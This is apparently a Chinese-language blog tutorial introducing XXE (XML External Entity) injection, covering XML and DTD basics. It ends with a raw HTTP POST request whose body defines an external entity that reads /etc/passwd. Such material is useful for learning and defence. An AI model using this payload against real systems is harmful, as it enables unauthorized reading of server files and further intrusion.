感觉以前也没怎么在意，然后技术摸底就被问起来了，仔细探究一下发现一些大型漏洞里面也都能发现XXE的影子，从XML注入到任意文件读取，到代码或者命令执行，内网端口探测，攻击内网主机等等。

## 简介
XXE全称是——XML External Entity,也就是XML外部实体注入攻击.漏洞是在对不安全的外部实体数据进行处理时引发的安全问题。一个比较经典的例子 
![注入一个XML节点，使添加了一个管理员账户](https://i.loli.net/2019/07/12/5d280db66707453328.png)

## 基础知识
- XML是一种标记语言，被无数软件项目采用
- DTD全称是The document type definition，即是文档类型定义，可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。
- DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。
- POST /xml.php HTTP/1.1

Host: 10.12.11.50

User-Agent: python-requests/2.18.4

Accept-Encoding: gzip, deflate

Accept: */*

Connection: close

Content-Length: 137

Content-Type: application/x-www-form-urlencoded



<?xml version="1.0" encoding="utf-8"?> 

<!DOCTYPE creds [  

<!ENTITY goodies SYSTEM "file:///etc/passwd"> ]> 

<creds>&goodies;</creds>